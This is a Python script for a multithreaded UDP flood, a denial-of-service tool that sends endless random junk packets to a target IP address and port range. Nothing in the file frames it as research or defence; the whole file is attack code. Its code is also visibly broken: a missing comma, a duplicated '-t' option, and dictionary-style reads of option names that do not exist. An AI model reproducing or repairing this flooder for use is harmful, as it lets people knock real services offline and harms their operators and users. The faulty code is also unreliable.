import socket, threading, random, time, string
from optparse import OptionParser
from colorama import Fore, Back, Style
from datetime import date

status_colors = {
    "+": Fore.GREEN,            # Success
    "-": Fore.RED,              # Failure
    "*": Fore.YELLOW,           # Warning
    ":": Fore.CYAN,             # Info
    " ": Fore.WHITE             # Normal
}

starting_port = 80
ending_port = 80
threads = 100
message_size = 10
message_multiplier = 100

def display(status, data):
    print(f"{status_colors[status]}[{status}] {Fore.BLUE}[{date.today()} {time.strftime('%H:%M:%S', time.localtime())}] {status_colors[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}")
def get_arguments(*args):
    parser = OptionParser()
    for arg in args:
        parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
    return parser.parse_args()[0]

def attack(target_ip, port, socket_type, message_len, message_multiplier):
    garbage = str(''.join((random.choices(string.ascii_letters, k=message_len)))*message_multiplier).encode()
    while True:
        with socket.socket(socket_type, socket.SOCK_DGRAM) as connection:
            connection.connect((target_ip, port))
            connection.sendto(garbage, (target_ip, port))
            display('+', f"Send Packet to {Back.RED}{target_ip}:{port}{Back.RESET}")

if __name__ == "__main__":
    data = get_arguments(('-t', "--target", "target", "IP Address of the Target"),
                         ('-s', "--starting-port", "starting_port", f"Starting Port for Port Range (Default={starting_port})"),
                         ('-e', "--ending-port", "ending_port", f"Ending Port for the Port Range (Default={ending_port})"),
                         ('-t', "--threads", "threads", f"Number of Threads (Default={threads})")
                         ('-l', "--message-length", "message_length", f"Length of the Garbage message to send (Default={message_size})"),
                         ('-M', "--message-multiplier", "message_multiplier", f"The value with which the message should be multiplied (Default={message_multiplier})"))
    if not data.target:
        display('-', "Please specify a Target")
        exit(0)
    if not data.starting_port:
        data.starting_port = starting_port
    else:
        data.starting_port = int(data.starting_port)
    if not data.ending_port:
        data.ending_port = ending_port
    else:
        data.ending_port = int(data.ending_port)
    if not data.threads:
        data.threads = threads
    else:
        data.threads = int(data.threads)
    if not data.message_length:
        data.message_length = message_size
    else:
        data.message_length = int(data.message_length)
    if not data.message_multiplier:
        data.message_multiplier = message_multiplier
    else:
        data.message_multiplier = int(data.message_multiplier)
    if '.' in data["Target_IP"]:
        socket_type = socket.AF_INET
    else:
        socket_type = socket.AF_INET6
    print(data["Threads"])
    for i in range(data["Threads"]):
        for port in range(data["Starting_Port"], data["Ending_Port"]+1):
            thread = threading.Thread(target=lambda: attack(data["Target_IP"], port, socket_type, data["Message_Size"], data["Message_Multiplier"]))
            thread.start()